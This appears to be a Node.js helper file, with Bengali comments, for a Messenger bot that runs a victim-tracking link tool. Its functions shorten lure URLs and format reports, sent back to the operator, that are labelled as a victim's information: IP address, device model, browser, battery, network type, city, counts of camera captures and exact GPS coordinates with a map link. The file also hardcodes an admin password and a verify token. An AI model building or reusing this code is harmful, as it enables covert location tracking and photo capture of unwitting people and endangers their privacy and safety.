const axios = require('axios');
const Config = require('../models/Config');
const fs = require('fs-extra');
const path = require('path');

// ===== লোকাল কনফিগ =====
function getLocalConfig() {
    const file = path.join(__dirname, '../data/config.json');
    if (fs.existsSync(file)) {
        try {
            return fs.readJsonSync(file);
        } catch (e) {
            return { mongoUri: '', adminPassword: 'Sakib@7890' };
        }
    }
    return { mongoUri: '', adminPassword: 'Sakib@7890' };
}

// ===== MongoDB থেকে কনফিগ =====
async function getConfig() {
    try {
        let config = await Config.findOne({ key: 'bot_config' });
        if (!config) {
            config = new Config({
                key: 'bot_config',
                pageAccessToken: '',
                verifyToken: 'Sakib_Verify',
                baseUrl: ''
            });
            await config.save();
        }
        return config;
    } catch (err) {
        console.log('⚠️ MongoDB থেকে কনফিগ আনতে ব্যর্থ, লোকাল ডিফল্ট ব্যবহার:', err.message);
        return {
            pageAccessToken: '',
            verifyToken: 'Sakib_Verify',
            baseUrl: 'http://localhost:3000'
        };
    }
}

// ===== মেসেজ পাঠানো =====
async function sendMessage(recipientId, text) {
    try {
        const config = await getConfig();
        const token = config.pageAccessToken;
        if (!token) {
            console.error('❌ পেজ অ্যাক্সেস টোকেন সেট করা নেই!');
            return;
        }
        await axios.post(`https://graph.facebook.com/v18.0/me/messages?access_token=${token}`, {
            recipient: { id: recipientId },
            message: { text: text }
        });
    } catch (err) {
        console.error('❌ মেসেজ পাঠাতে ব্যর্থ:', err.response?.data || err.message);
    }
}

// ===== ইউজার প্রোফাইল =====
async function getUserProfile(senderId) {
    try {
        const config = await getConfig();
        const token = config.pageAccessToken;
        if (!token) return null;
        const res = await axios.get(`https://graph.facebook.com/${senderId}?access_token=${token}`);
        return res.data;
    } catch (err) {
        console.error('Profile fetch error:', err.message);
        return null;
    }
}

// ===== লিংক শর্ট করা =====
async function shortenUrl(longUrl) {
    try {
        const response = await axios.get(`https://is.gd/create.php?format=simple&url=${encodeURIComponent(longUrl)}`, {
            timeout: 5000
        });
        return response.data.trim();
    } catch (err) {
        console.error('Shorten error:', err.message);
        return longUrl;
    }
}

// ================================================================
// 🆕 নতুন formatVictimData - শুধু প্রয়োজনীয় তথ্য
// ================================================================
function formatVictimData(victim) {
    const d = victim.device || {};
    
    // ডিভাইসের সময় লোকাল টাইমে দেখান
    const deviceTime = new Date().toLocaleString('bn-BD', { timeZone: 'Asia/Dhaka' });
    
    let msg = '✅ *ভিক্টিমের তথ্য পাওয়া গেছে!*\n\n';
    
    // IP ও সময়
    msg += `⚓️ *আইপি অ্যাড্রেস:* ${victim.ip || 'N/A'}\n`;
    msg += `🕐 *সময়:* ${deviceTime}\n\n`;
    
    // ফোনের মডেল (platform থেকে)
    const phoneModel = d.platform || d.userAgent?.split('(')[1]?.split(')')[0] || 'N/A';
    msg += `📱 *ফোনের মডেল:* ${phoneModel}\n`;
    
    // ব্রাউজার (userAgent থেকে)
    const browser = d.userAgent?.match(/(Chrome|Firefox|Safari|Edge|Opera)\/[0-9.]+/)?.[0] || 'N/A';
    msg += `🌐 *ব্রাউজার:* ${browser}\n`;
    
    // টাচ পয়েন্ট
    msg += `👆 *টাচ পয়েন্ট:* ${d.maxTouchPoints || 0}\n`;
    
    // ভাষা
    msg += `🗣️ *ভাষা:* ${d.language || 'N/A'}\n\n`;
    
    // চার্জ
    const b = victim.battery || {};
    msg += `🔋 *চার্জ:* ${b.level || 'N/A'}%\n`;
    msg += `⚡ *চার্জ হচ্ছে:* ${b.charging ? 'হ্যাঁ' : 'না'}\n\n`;
    
    // নেটওয়ার্ক (ওয়াইফাই নাকি ডেটা)
    const n = victim.network || {};
    const connectionType = n.type || 'N/A';
    msg += `📶 *কানেকশন:* ${connectionType === 'wifi' ? '📶 ওয়াইফাই' : connectionType === 'cellular' ? '📱 মোবাইল ডেটা' : connectionType}\n\n`;
    
    // আনুমানিক অবস্থান
    if (victim.location && victim.location.city) {
        msg += `📍 *আনুমানিক অবস্থান:* ${victim.location.city}, ${victim.location.country}\n`;
    } else {
        msg += `📍 *আনুমানিক অবস্থান:* N/A\n`;
    }
    
    // ক্যামেরা ছবির সংখ্যা (শুধু সংখ্যা)
    if (victim.camera && victim.camera.length > 0) {
        msg += `\n📸 *ক্যামেরা ছবি:* ${victim.camera.length}টি`;
    }
    
    msg += `\n\n🆔 ভিক্টিম আইডি: ${victim.id}`;
    return msg;
}

// ================================================================
// 🆕 লোকেশন পারমিশনের জন্য আলাদা মেসেজ
// ================================================================
function formatLocationMessage(gpsLocation) {
    if (!gpsLocation || !gpsLocation.latitude) return null;
    
    const mapLink = gpsLocation.googleMaps || 
        `https://www.google.com/maps?q=${gpsLocation.latitude},${gpsLocation.longitude}`;
    
    return `📍 *লোকেশন পারমিশন দেওয়া হয়েছে!*\n\n` +
           `📌 অক্ষাংশ: ${gpsLocation.latitude}\n` +
           `📌 দ্রাঘিমাংশ: ${gpsLocation.longitude}\n` +
           `🎯 নির্ভুলতা: ${gpsLocation.accuracy} মিটার\n\n` +
           `🔗 গুগল ম্যাপ: ${mapLink}`;
}

module.exports = {
    getConfig,
    getLocalConfig,
    sendMessage,
    getUserProfile,
    shortenUrl,
    formatVictimData,
    formatLocationMessage
};